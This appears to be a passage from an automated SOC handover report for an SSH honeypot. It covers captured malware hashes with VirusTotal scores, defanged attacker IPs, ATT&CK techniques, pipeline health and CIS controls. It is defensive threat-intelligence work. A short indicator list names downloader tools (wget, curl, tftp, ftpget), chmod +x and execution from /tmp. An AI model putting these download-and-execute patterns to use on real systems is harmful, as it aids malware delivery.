| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 41/100 | 🟡 MEDIUM | **29/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **26/75** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `77.239.124[.]110` | NL | ROCKET & MARINICA LTD | **100** ⚠️ | 2 |
| `164.92.115[.]22` | US | DigitalOcean, LLC | **100** ⚠️ | 7 |
| `122.170.99[.]195` | IN | ABTS-MUMBAI | **100** ⚠️ | 50 |
| `92.204.138[.]142` | US | Host Europe GmbH | **100** ⚠️ | 21 |
| `163.177.76[.]83` | CN | China Unicom Guangdong province network | **100** ⚠️ | 6 |
| `34.146.217[.]105` | JP | Google LLC | **100** ⚠️ | 50 |
| `39.105.212[.]205` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 50 |
| `49.124.153[.]19` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 48 |
| `182.53.52[.]68` | TH | TOT Public Company Limited | **100** ⚠️ | 50 |
| `60.223.250[.]50` | CN | China Unicom Shanxi Province Network | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 99 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 85 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 41 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 41 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 41 |

---

## 🔕 False Positive Summary (26 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 1 below threshold 25 | 1 |
| AbuseIPDB score 19 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 2 |
| AbuseIPDB score 4 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 17 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 231 cases |
| Tool 34  | Credential Extractor        | ✅ 98 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 15 fingerprints |
| Tool 36  | Command Clustering          | ✅ 6 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 70 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 26 filtered (11.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 2 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 22 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 85 priority case(s) shown individually · 28 recon entry/entries in table (12 group(s) consolidating 104 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-10T16:57:51Z_
